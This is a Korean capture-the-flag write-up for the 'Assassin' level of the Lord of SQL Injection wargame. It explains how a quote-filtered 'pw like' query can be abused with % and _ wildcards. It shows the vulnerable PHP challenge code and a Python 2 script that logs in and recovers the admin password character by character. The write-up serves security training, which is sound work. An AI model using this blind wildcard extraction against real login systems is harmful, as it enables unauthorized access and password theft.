---
layout: default
title: Assassin
parent: Load Of SQL Injection
nav_order: 15
---

# Assassin

작은 따옴표가 필터링 되어있기 때문에 임의적으로 쿼리문을 조작할 수 없다.

하지만 pw like '' 이라고 되어있는 부분에서 힌트를 얻을 수 있는데, like 키워드는 %, _ 와 같은 와일드카드를 사용할 수 있다.

예를들어 pw가 guest라면 g% 만 넣어도 g 이후 문자가 와일드카드 처리되어 True 판정이 나온다.

이를 이용해 한글자씩 넣어보며 pw를 알아내면 된다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>
```

python으로 툴을 짜 pw를 가져올 수 있다.

```python
import urllib, urllib2, cookielib, re, ssl
key=''
length=0
is_admin=False
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders={('User-agent','Mozila/5.0(compatible;MSIE 5.5;Windows NT)')}

loginUrl2='https://los.eagle-jump.org/?login'
login_form={"id":"los_id","pw":"los_pw"}
login_form=urllib.urlencode(login_form)
reqLogin = opener.open('https://los.eagle-jump.org/?login',login_form)
url = 'https://los.eagle-jump.org/gate.php'
req=opener.open(url)

print 'Assassin'
while 1:
    subkey = 31
    for x in range(96):
        subkey=subkey+1
        hexkey=chr(subkey);
        if hexkey=="%":
    	    subkey=subkey+1
	    hexkey=chr(subkey)
	if hexkey=="_":
	    subkey=subkey+1
	    hexkey=chr(subkey)
        url='https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw=%s%s%%' %(key,hexkey)
        print url
        resp=opener.open(url)
        rresp=resp.read()
        find=re.findall("Hello admin",rresp)
        if find:
            print 'find admin'
	    is_admin=True
	    tmpkey=hexkey
            break
        find=re.findall("Hello guest",rresp)
        if find:
	    print 'find guest'
	    tmpkey=hexkey
    key=key+tmpkey
    if is_admin:
	print key+"%"
        break
print 'clear'
```